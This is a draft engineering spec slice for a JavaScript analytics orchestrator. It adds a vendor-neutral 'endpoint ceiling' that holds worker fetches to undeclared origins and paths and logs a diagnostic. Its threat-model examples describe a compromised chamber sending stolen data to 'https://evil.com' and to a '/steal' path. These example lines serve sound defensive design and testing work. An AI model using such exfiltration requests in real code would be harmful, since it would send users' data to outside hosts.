---
status: DRAFT
dependencies: []
last_verified:
frame_review: true
---

<!-- jig grounding (spec 064-02 / ADR-0020): ground factual claims about
     runnable surfaces by probe first (run it / read source) or a citation. -->

## Slice 016-01 — GA4 wire-protocol endpoint ceiling (the EXACT archetype)

**Goal:** Make `endpoints` **authoritative** for the wire-protocol egress path. Build a generic,
vendor-neutral `core/` endpoint-ceiling control and wire it into the **async worker dispatch seam**
(`core/airlock.js`'s `worker.onmessage` → `fetch(r.url)`) so that **before** the orchestrator dispatches
a worker-mapped request, it checks the outbound **origin + pathname** against the host connector's
**declared endpoints**; an **undeclared** destination is **HELD** (no `fetch`) and surfaced through the
**009-02** diagnostics seam. A compromised GA4 chamber that emits a foreign-sink `ready` request
(`{ url: "https://evil.com", body: <stolen> }`) is **blocked** — the **first** egress-destination gate
in `core/` (no host allow-list was ever built; §Overview). GA4 is the **exact** ceiling: its declared
set is a bounded fixed endpoint. Keep it narrow (one control, one seam, one archetype).

**DoR:**
- ✅ [ADR-0006](../../decisions/adr-0006-capability-manifest.md) Accepted — the ceiling law
  (`granted = declared ∩ host-policy ∩ consent`, declaration-as-ceiling, fails-closed). This slice
  enforces the **`declared`** term at the wire-protocol seam.
- ✅ The manifest declares `endpoints` (012-04): `connectors/ga4/connector.js` →
  `endpoints: [...new Set(config.endpoints)]`, and `handle` posts `{ url: endpoints[t] }` — so the
  declared set is self-consistent with the deploy-time config. Grounded.
- ✅ The async worker dispatch seam exists: `core/airlock.js` `worker.onmessage` dispatches the
  worker's `ready: [{ url, body }]` via `fetch(r.url, …)` — the chamber-chosen-url chokepoint. Grounded.
- ✅ The 009-02 diagnostics seam (`onDiagnostic`/`consoleDiagnostic`, record `{ level, kind, … }`)
  exists in `core/airlock.js`. Grounded.

**Acceptance Criteria:**

1. **Generic control in `core/` (vendor-neutral, origin+pathname).** A new `core/endpoint-ceiling.js`
   exports `checkEndpointCeiling(url, declaredEndpoints)` → `{ verdict: "allow" | "hold", destination,
   reason }`. It reduces **both** the outbound url and every declared endpoint to **origin + pathname**
   (dropping query + fragment) and holds unless the outbound origin+path ∈ the declared set. No GA4/alloy
   specifics in `core/` (`test/core-boundary.test.js` stays green — no `core/ → ../rig/` import).
2. **Origin+pathname granularity (Kill #4 + no-secrets).** A declared
   `https://host/collect?measurement_id=X&api_secret=Y` and an outbound `…/collect?…&_extra=1` both
   reduce to `https://host/collect` → **allow** (deploy-time query params don't break the ceiling); an
   outbound to a **different path** (`…/steal`) or **different origin** (`https://evil.com/collect`) →
   **hold**. The `api_secret`/`measurement_id` query is **never** compared or logged.
3. **Wired into the async worker seam (fail-closed).** In `core/airlock.js`'s `worker.onmessage`,
   **before** `fetch(r.url)`, each `ready` request is checked against the connector's declared endpoints;
   an undeclared destination is **HELD** — no `fetch` issued. Observable: a `ready` request to an
   undeclared origin+path produces **zero** egress; a declared one dispatches unchanged.
4. **ALERT — every held destination surfaced (009-02).** A held request emits a diagnostic
   `{ level: "error", kind: "endpoint-ceiling", disposition: "held", destination, reason }` through the
   `onDiagnostic` sink. `destination` names the outbound **origin+pathname** (the destination the
   chamber chose — triage-critical, and *not* a user identifier; query/body are **never** included, so
   no secret leaks). The honest path (allow) emits **none**.
5. **Per-connector attribution threaded in (not read from the request).** The declared endpoints are the
   **host connector's**, passed to `createAirlock` at construction (it already receives `endpoints`) and
   reduced to the ceiling set there — **not** derived from the chamber's `r.url`. Observable: chamber
   code cannot widen its own ceiling. (Single-connector-per-host today; multi-chamber attribution is a
   named forward-looking follow-up, not built here.)
6. **The sync fast path's destination is config-pinned — asserted, not gated.** `core/egress.js`'s
   critical dispatcher posts to `endpoints[t]` (host config, main-thread) — **not** chamber-chosen — so
   its destination is in the declared set **by construction**. A test asserts this invariant (the sync
   dispatcher's destinations ⊆ the declared set); **no** redundant ceiling gate is added there. Observable:
   the sync path needs no destination check because its destination is orchestrator-controlled.
7. **E2E: a compromised chamber's foreign-sink is neutralized.** A `test/` harness drives the real
   `createAirlock` async seam (a fake worker emitting a foreign-sink `ready` request) → **held** + a
   `endpoint-ceiling` diagnostic; an honest `ready` request to a declared endpoint → **dispatched** +
   silent.

**DoD:**
- [ ] ACs 1–7 pass — a foreign-sink `ready` request is held + alerted; the honest path dispatches +
      silent; the sync-path invariant holds. Green against targeted tests. _(Do NOT run the full suite
      unguarded — the stale nested worktree's oracle/conformance tests hang it; run targeted files.)_
- [ ] **No regression** — GA4/coalescing/connector-host/wrapped-sdk-host/contract-stability stay green;
      the 015 config-integrity seam untouched.
- [ ] Reviews: compliance + craft + **arch** (a new `core/` enforcement seam + a data-flow change:
      attribution threaded to the dispatch) + reconciliation, recorded pass.
- [ ] Deviation log + reconciliation sweep; the 012-04 advisory→authoritative flip reflected;
      `docs/refinement-todo.md` endpoint-ceiling item (if any) + the multi-chamber-attribution +
      host-policy-layer follow-ups tracked; `docs/releases/mvp3.md` Include row updated.
- [ ] **No secrets committed** — no `api_secret`/`measurement_id` in any manifest, test fixture, or
      diagnostic; synthetic hosts only; the ceiling compares origin+path (query dropped).

**Anti-horizontal-phasing check:** after this slice, a compromised **GA4** chamber **cannot** exfiltrate
to a destination its connector did not declare — its undeclared egress is **held** at the async seam and
surfaced. Observable value: the first egress-destination teeth in `core/`, exact for the wire-protocol
archetype. (alloy's floor + the wrapped-SDK seam are 016-02; the `∩ host-policy` and `∩ consent` terms
are deferred to their own specs.)
